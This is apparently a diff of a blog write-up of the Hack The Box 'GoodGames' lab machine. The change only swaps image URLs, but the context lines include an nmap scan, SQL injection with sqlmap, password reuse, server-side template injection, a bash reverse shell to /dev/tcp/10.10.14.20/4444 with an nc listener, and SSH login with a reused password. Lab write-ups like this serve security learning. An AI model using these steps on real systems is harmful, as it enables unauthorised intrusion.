@@ -9,7 +9,7 @@ tags: docker sql-injection nmap port-forwarding sqlmap ssti python flask
 
 # Resolution of GoodGames machine of Hack The Box
 
-![](https://i.ibb.co/yqd7tfJ/homepage.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/goodgames.webp)
 
 ### 🎮 *"¡Hacking is the BEST GAME!"*
 
@@ -44,7 +44,7 @@ sudo nmap 10.10.11.130 -p 80 -sVC -sS -Pn -oN scanNormal -vvv
 
 #### With the complete scan we obtain the following result:
 
-![](https://i.ibb.co/6FsCvWq/scan-Normal.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/scan-Normal.webp)
 
 
 #### We see the domain "goodgames.htb", so we add it to our /etc/hosts file and proceed to visit the site.
@@ -55,13 +55,13 @@ sudo nmap 10.10.11.130 -p 80 -sVC -sS -Pn -oN scanNormal -vvv
 
 #### After visiting the page we find a section to authenticate with "Email" and "Password":
 
-![](https://i.ibb.co/G5n12gT/homepage.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/homepage.webp)
 
 #### Based on this, we proceed to test if the login is vulnerable to SQL Injection:
 
 First we capture the request with **Burp Suite** and save it with the name "req.txt".
 
-![](https://i.ibb.co/jgM4HPB/req-burpsuite.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/req-burpsuite.webp)
 
 ### SQL Injection - SQLmap
 
@@ -147,7 +147,7 @@ http://internal-administration.goodgames.htb/
 
 #### Once logged in to the subdomain, you will find a login panel:
 
-![](https://i.ibb.co/G2jm89p/login-flask.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/login-flask.webp)
 
 #### When trying to use the same password ("superadministrator") with the username "admin", we managed to authenticate and access the dashboard. *This is a common security flaw, so it is important to always use different passwords for each location.
 
@@ -161,7 +161,7 @@ http://internal-administration.goodgames.htb/
 ```
 {% endraw %}
 
-![](https://i.ibb.co/jgkzY1Y/ssti-49.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/ssti-49.webp)
 
 #### Now that we know that it is vulnerable to Server-Side Template Injection we can try to run a reverse shell on the Server-Side to our attacking machine. 
 
@@ -198,7 +198,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"
 nc -lvp 4444
 ```
 
-![](https://i.ibb.co/0mjcbnS/netcat.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/netcat.webp)
 
 ##### If we look at our hostname IP address, we see that it appears that we might be inside a Docker container. Additionally we are as root user inside this container.
 
@@ -220,7 +220,7 @@ ssh augustus@172.19.0.1
 augustus@172.19.0.1's password: superadministrator
 ```
 
-![](https://i.ibb.co/Hpq30pf/ssh-augustus.png)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/goodgames.htb/ssh-augustus.webp)
 
 #### By executing "hostname -I" we can see that we are already inside the local host by the machine's IP address (10.10.11.130):
 
